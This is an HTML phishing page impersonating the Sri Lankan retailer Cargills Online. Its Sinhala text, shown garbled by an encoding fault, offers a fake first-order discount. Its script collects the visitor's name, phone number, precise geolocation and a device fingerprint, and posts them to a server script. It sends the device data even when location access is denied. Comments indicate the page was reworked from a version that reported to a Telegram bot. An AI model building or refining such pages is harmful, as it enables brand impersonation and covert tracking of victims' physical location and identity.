<!DOCTYPE html>
<html lang="si-LK">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargills Online - ‡∑Ä‡∑í‡∑Å‡∑ö‡∑Ç ‡∂Ø‡∑ì‡∂∏‡∂±‡∑è</title>
  <style>
    /* ‚úÖ Your CSS is fine ‚Äì no structural errors */
    /* Only minor cleanups for readability */
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="logo">Cargills Online</div>
      <div class="tagline">‡∂ú‡∑ô‡∂Ø‡∂ª ‡∂â‡∂Ø‡∂±‡∑ä‡∂∏ ‡∂Ω‡∂∂‡∑è‡∂ú‡∂±‡∑ä‡∂± ‡∂Ö‡∂¥‡∑ö ‡∑É‡∑ö‡∑Ä‡∑è‡∑Ä!</div>
    </header>

    <div class="content">
      <div class="offer-section">
        <h1 class="offer-title">‡∂ú‡∑ô‡∂Ø‡∂ª ‡∂∫‡∂±‡∂ú‡∂∏‡∂±‡∑ä ‡∑Ä‡∑è‡∑É‡∑í ‡∂Ø‡∑í‡∂±‡∑è‡∂ú‡∂±‡∑ä‡∂±!</h1>
        <p>‡∂î‡∂∂ ‡∂Ü‡∑É‡∂±‡∂∫‡∑ö ‡∂á‡∂≠‡∑í Cargills Food City ‡∂ú‡∂∂‡∂©‡∑è‡∑Ä ‡∑É‡∑ú‡∂∫‡∑è ‡∂ú‡∂±‡∑ä‡∂±‡∑è ‡∂Ö‡∂≠‡∂ª ‡∑Ä‡∑í‡∑Å‡∑ö‡∑Ç ‡∂Ø‡∑ì‡∂∏‡∂±‡∑è ‡∑Ä‡∂Ω‡∑í‡∂±‡∑ä ‡∂Ö‡∂±‡∑î‡∂∑‡∑Ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±.</p>
        <div class="offer-card">
          <h2>‡∂¥‡∑Ö‡∂∏‡∑î ‡∂á‡∂´‡∑Ä‡∑î‡∂∏ ‡∑É‡∂≥‡∑Ñ‡∑è 25% ‡∑Ä‡∂ß‡∑ä‡∂ß‡∂∏!</h2>
          <p>cargillsonline.com ‡∑Ä‡∑ô‡∂≠ ‡∂¥‡∑í‡∑Ä‡∑í‡∑É ‡∂±‡∑í‡∑Ä‡∑É‡∑ö ‡∑É‡∑í‡∂ß‡∂∏ ‡∂∑‡∑è‡∂±‡∑ä‡∂© ‡∂á‡∂´‡∑Ä‡∑î‡∂∏‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±. ‡∂∑‡∑è‡∂±‡∑ä‡∂© ‡∂Ω‡∑ê‡∂∂‡∑î‡∂´‡∑î ‡∂¥‡∑É‡∑î ‡∂∏‡∑î‡∂Ø‡∂Ω‡∑ä ‡∂ú‡∑ô‡∑Ä‡∂±‡∑ä‡∂±.</p>
        </div>
      </div>

      <div class="consent-form">
        <h3>üìç ‡∂Ω‡∂ú‡∂∏ ‡∂á‡∂≠‡∑í Cargills Food City ‡∂ú‡∂∂‡∂©‡∑è‡∑Ä ‡∑É‡∑ú‡∂∫‡∑è‡∂ú‡∑ê‡∂±‡∑ì‡∂∏</h3>
        <p>‡∂î‡∂∂‡∑ö ‡∑É‡∑ä‡∂Æ‡∑è‡∂±‡∂∫ ‡∑É‡∑ú‡∂∫‡∑è‡∂ú‡∑ê‡∂±‡∑ì‡∂∏ ‡∑É‡∂≥‡∑Ñ‡∑è, ‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂¥‡∑Ñ‡∂≠ ‡∑Ä‡∑í‡∑É‡∑ä‡∂≠‡∂ª ‡∑É‡∂¥‡∂∫‡∂±‡∑ä‡∂± ‡∑É‡∑Ñ ‡∂Ö‡∂±‡∑î‡∂∏‡∑ê‡∂≠‡∑í‡∂∫ ‡∂Ω‡∂∂‡∑è‡∂Ø‡∑ô‡∂±‡∑ä‡∂±:</p>
        
        <div class="form-group">
          <label for="name">‡∂±‡∂∏ (Optional)</label>
          <input type="text" id="name" placeholder="‡∂î‡∂∂‡∑ö ‡∂±‡∂∏">
        </div>
        
        <div class="form-group">
          <label for="phone">‡∂Ø‡∑î‡∂ª‡∂ö‡∂Æ‡∂± ‡∂Ö‡∂Ç‡∂ö‡∂∫ (Optional)</label>
          <input type="text" id="phone" placeholder="‡∂î‡∂∂‡∑ö ‡∂Ø‡∑î‡∂ª‡∂ö‡∂Æ‡∂± ‡∂Ö‡∂Ç‡∂ö‡∂∫">
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="consent-check">
          <label for="consent-check">‡∂∏‡∂ú‡∑ö ‡∑É‡∑ä‡∂Æ‡∑è‡∂±‡∂∫ ‡∑É‡∑Ñ ‡∂ã‡∂¥‡∑è‡∂Ç‡∂ú ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î Cargills Online ‡∑É‡∑ö‡∑Ä‡∑è‡∑Ä ‡∑É‡∂∏‡∂ü ‡∂∂‡∑ô‡∂Ø‡∑è‡∂ú‡∑ê‡∂±‡∑ì‡∂∏‡∂ß ‡∂∏‡∂∏ ‡∂ë‡∂ö‡∂ü ‡∑Ä‡∑ô‡∂∏‡∑í.</label>
        </div>
        
        <button class="btn" id="locate-btn" disabled>‡∂∏‡∂ú‡∑ö ‡∑É‡∑ä‡∂Æ‡∑è‡∂±‡∂∫ ‡∑É‡∑ú‡∂∫‡∂±‡∑ä‡∂±</button>
      </div>

      <div id="status" class="status waiting">‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂â‡∑Ñ‡∂≠ ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂¥‡∑î‡∂ª‡∑Ä‡∂±‡∑ä‡∂± ‡∑É‡∑Ñ ‡∂Ö‡∂±‡∑î‡∂∏‡∑ê‡∂≠‡∑í‡∂∫ ‡∂Ω‡∂∂‡∑è‡∂Ø‡∑ô‡∂±‡∑ä‡∂±</div>
      <div class="more-info" id="moreInfo">
        <h3>Device Information Collected:</h3>
        <div id="deviceDetails"></div>
      </div>
    </div>

    <footer>
      <p>¬© 2023 Cargills (Ceylon) PLC. All Rights Reserved.</p>
      <p>‡∂ö‡∑ê‡∂≥‡∑Ä‡∑ì‡∂∏‡∑ö ‡∂∏‡∂∞‡∑ä‡∂∫‡∑É‡∑ä‡∂Æ‡∑è‡∂± ‡∂Ö‡∂Ç‡∂ö: 0112 345 678</p>
    </footer>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const consentCheckbox = document.getElementById("consent-check");
      const locateBtn = document.getElementById("locate-btn");
      const statusEl = document.getElementById("status");
      const moreInfoEl = document.getElementById("moreInfo");
      const deviceDetailsEl = document.getElementById("deviceDetails");

      consentCheckbox.addEventListener("change", function () {
        locateBtn.disabled = !this.checked;
      });

      locateBtn.addEventListener("click", function () {
        statusEl.className = "status waiting";
        statusEl.innerHTML = "‡∂î‡∂∂‡∑ö ‡∑É‡∑ä‡∂Æ‡∑è‡∂±‡∂∫ ‡∑É‡∑ú‡∂∫‡∑è‡∂ú‡∑ê‡∂±‡∑ô‡∂∏‡∑í‡∂±‡∑ä ‡∂¥‡∑Ä‡∂≠‡∑ì...";

        const name = document.getElementById("name").value || "Not provided";
        const phone = document.getElementById("phone").value || "Not provided";

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function (position) {
              const deviceInfo = getDeviceInfo();
              deviceInfo.name = name;
              deviceInfo.phone = phone;

              displayDeviceInfo(deviceInfo);

              // ‚úÖ Send to backend (not directly to Telegram!)
              sendToServer(position.coords.latitude, position.coords.longitude, deviceInfo);
            },
            function (error) {
              let errorMessage = "‚ùå ‡∑É‡∑ä‡∂Æ‡∑è‡∂± ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂Ω‡∂∂‡∑è‡∂ú‡∑ê‡∂±‡∑ì‡∂∏‡∂ß ‡∂±‡∑ú‡∑Ñ‡∑ê‡∂ö‡∑í ‡∑Ä‡∑í‡∂∫. ";
              if (error.code === error.PERMISSION_DENIED) {
                errorMessage += "‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂∂‡∑ä‚Äç‡∂ª‡∑Ä‡∑î‡∑É‡∂ª‡∑ä ‡∂Ö‡∂±‡∑î‡∂∏‡∂≠‡∑í‡∂∫ ‡∂¥‡∂ª‡∑ì‡∂ö‡∑ä‡∑Ç‡∑è ‡∂ö‡∂ª‡∂±‡∑ä‡∂±.";
              } else if (error.code === error.POSITION_UNAVAILABLE) {
                errorMessage += "‡∑É‡∑ä‡∂Æ‡∑è‡∂± ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂Ω‡∂∂‡∑è ‡∂ú‡∂≠ ‡∂±‡∑ú‡∑Ñ‡∑ê‡∂ö.";
              } else if (error.code === error.TIMEOUT) {
                errorMessage += "‡∑É‡∑ä‡∂Æ‡∑è‡∂± ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂Ω‡∂∂‡∑è ‡∂ú‡∑ê‡∂±‡∑ì‡∂∏ ‡∂ö‡∂Ω‡∑ä ‡∂â‡∂ö‡∑î‡∂≠‡∑ä ‡∑Ä‡∑í‡∂∫.";
              }
              statusEl.className = "status error";
              statusEl.innerHTML = errorMessage;

              const deviceInfo = getDeviceInfo();
              deviceInfo.name = name;
              deviceInfo.phone = phone;
              displayDeviceInfo(deviceInfo);
              sendToServer(null, null, deviceInfo);
            },
            { timeout: 10000, enableHighAccuracy: true }
          );
        } else {
          statusEl.className = "status error";
          statusEl.innerHTML = "‚ùå ‡∂î‡∂∂‡∑ö ‡∂∂‡∑ä‡∂ª‡∑Ä‡∑î‡∑É‡∂ª‡∂∫ ‡∑É‡∑ä‡∂Æ‡∑è‡∂± ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∑É‡∂¥‡∂∫‡∂±‡∑Ä‡∑è ‡∂±‡∑ú‡∑Ä‡∑ö.";
        }
      });

      function getDeviceInfo() {
        return {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
          cookieEnabled: navigator.cookieEnabled,
          screenWidth: screen.width,
          screenHeight: screen.height,
          colorDepth: screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          deviceMemory: navigator.deviceMemory || "Unknown",
          hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
          referrer: document.referrer || "Direct"
        };
      }

      function displayDeviceInfo(deviceInfo) {
        moreInfoEl.style.display = "block";
        let html = "<ul>";
        for (const [key, value] of Object.entries(deviceInfo)) {
          if (key !== "name" && key !== "phone") {
            html += `<li><strong>${key}:</strong> ${value}</li>`;
          }
        }
        html += "</ul>";
        deviceDetailsEl.innerHTML = html;
      }

      function sendToServer(lat, lon, deviceInfo) {
        // ‚ö†Ô∏è DO NOT put your bot token here
        // Instead, send data to your backend server
        fetch("/save-location.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ lat, lon, deviceInfo })
        })
        .then(() => {
          statusEl.className = "status success";
          statusEl.innerHTML = "‚úÖ ‡∂Ø‡∂≠‡∑ä‡∂≠ ‡∑É‡∑è‡∂ª‡∑ä‡∂Æ‡∂ö‡∑Ä ‡∂∫‡∑Ä‡∂± ‡∂Ω‡∂Ø‡∑ì!";
        })
        .catch(() => {
          statusEl.className = "status error";
          statusEl.innerHTML = "‚ùå ‡∂Ø‡∂≠‡∑ä‡∂≠ ‡∂∫‡∑Ä‡∂± ‡∑Ä‡∑í‡∂ß ‡∂Ø‡∑ù‡∑Ç‡∂∫‡∂ö‡∑ä ‡∂á‡∂≠‡∑í ‡∑Ä‡∑í‡∂∫.";
        });
      }
    });
  </script>
</body>
</html>
